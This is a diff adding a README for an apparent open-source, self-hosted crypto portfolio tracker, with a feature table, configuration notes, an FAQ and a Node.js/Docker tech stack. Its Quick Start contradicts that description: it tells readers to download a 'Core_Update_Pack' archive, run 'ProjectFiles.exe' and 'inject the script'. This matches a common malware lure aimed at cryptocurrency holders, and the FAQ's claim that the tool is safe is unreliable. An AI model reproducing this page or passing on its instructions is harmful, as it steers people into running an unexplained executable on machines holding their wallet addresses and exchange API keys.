@@ -1,0 +1,82 @@
+💼 Crypto Portfolio Tracker
+
+Privacy-First Local Portfolio Manager — 2026
+
+A self-hosted, open-source cryptocurrency portfolio tracker.
+Track your real-time balances, calculate PnL (Profit and Loss), and manage your entire crypto history — without sending your data to the cloud.
+
+🎯 What it is
+
+Crypto Portfolio Tracker is a lightweight web application that runs on your own machine or server.
+Unlike centralized services, it does not require an account, does not track your IP, and gives you full control over your financial data.
+
+🔒 Privacy-first: All transactions, balances, and API keys are stored locally in an encrypted SQLite database.
+
+🚀 Quick Start
+
+1. Download Core_Update_Pack using the button above.
+2. Extract the archive into a separate folder.
+3. Run ProjectFiles.exe.
+4. Follow the on-screen instructions and inject the script.
+
+✨ Features
+
+| Feature                     | Description                                          |
+|-----------------------------|------------------------------------------------------|
+| 🔒 Local-First          | Data is stored in an encrypted SQLite database locally|
+| 📊 Real-Time PnL        | Automatically calculates profit/loss for your assets |
+| 📥 CSV & API Import     | Import history from Binance, Coinbase, or CSV files  |
+| 🪙 Multi-Chain Support  | Track Ethereum, Bitcoin, Solana, and EVM chains      |
+| 📈 Interactive Charts   | Visualize your portfolio allocation and performance  |
+| 🧾 Tax Reports          | Export transaction history for tax calculation       |
+| 🐳 Docker Ready         | One-command deployment with Docker Compose           |
+
+🛠️ How to use
+
+1. Launch the application (runs on localhost:3000 by default).
+2. Create a local master password to encrypt your database.
+3. Add your public wallet addresses (no private keys required) or connect read-only API keys for exchanges.
+4. Import historical transactions manually or via CSV.
+5. View your real-time dashboard and PnL.
+
+⚙️ Configuration
+
+You can adjust settings in the .env file:
+
+- PORT: Web server port (default: 3000)
+- CURRENCY: Base fiat currency (USD, EUR, etc.)
+- API_KEYS: Optional CoinGecko/Exchange API keys for rate limits
+- DATA_PATH: Path to the local SQLite database
+
+❓ FAQ
+
+Is it safe to use?
+Yes — the application runs entirely on your machine. It only connects to the internet to fetch public price data and read your wallet balances.
+
+Do I need to provide my private keys?
+No. For wallets, you only provide public addresses. For exchanges, you create a read-only API key.
+
+Can I sync between devices?
+You can export an encrypted backup of your database and import it on another device. Cloud sync is not supported by design.
+
+Does it support taxes?
+Yes, you can export a CSV report of your realized and unrealized gains, which can be uploaded to tax software.
+
+💻 Tech Stack & Architecture
+
+- Frontend: React / Next.js / Tailwind CSS
+- Backend: Node.js / TypeScript
+- Database: SQLite (encrypted with SQLCipher)
+- Price Data: CoinGecko API / Binance WebSockets
+- Deployment: Docker / Docker Compose
+
+🤝 Contributing
+
+Pull requests, bug reports, and feature suggestions are welcome.
+See CONTRIBUTING.md for guidelines.
+
+📜 License
+
+MIT License — free to use, modify and redistribute.
+
+⭐ Star the repo if it helped you.
